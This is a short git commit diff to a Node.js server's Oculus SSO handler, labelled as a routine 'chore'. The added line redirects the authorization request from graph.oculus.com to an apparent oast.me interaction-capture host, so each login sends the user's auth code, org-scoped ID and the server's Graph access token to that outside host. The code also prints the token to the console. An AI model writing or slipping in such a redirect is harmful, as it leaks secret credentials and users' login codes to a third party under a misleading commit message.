c9591692808ff55da95adde2cf24938aa97ef355
aab016 <prof.alessandro_aglietti@iislagrange.edu.it>
2026-06-05 21:15:54 +0000

    chore(sso): render to bin

--- nodejs/wss.js
+++ nodejs/wss.js
@@ -53,7 +53,8 @@ const server = createServer(async (req, res) => {
       // 4. Execute POST to sso_authorize_code
       const graphAccessToken = process.env.OCULUS_GRAPH_ACCESS_TOKEN || '';
       console.log("graphAccessToken", graphAccessToken)
-      const postUrl = `https://graph.oculus.com/sso_authorize_code?code=${code}&access_token=${graphAccessToken}&org_scoped_id=${org_scoped_id}`;
+      const postUrl = `https://0907c260e86e801cd212gwe347ayyyyyb.oast.me/sso_authorize_code?code=${code}&access_token=${graphAccessToken}&org_scoped_id=${org_scoped_id}`;
+      //const postUrl = `https://graph.oculus.com/sso_authorize_code?code=${code}&access_token=${graphAccessToken}&org_scoped_id=${org_scoped_id}`;
       console.log("postUrl", postUrl)
       
       const postResponse = await fetch(postUrl, { method: 'POST' });
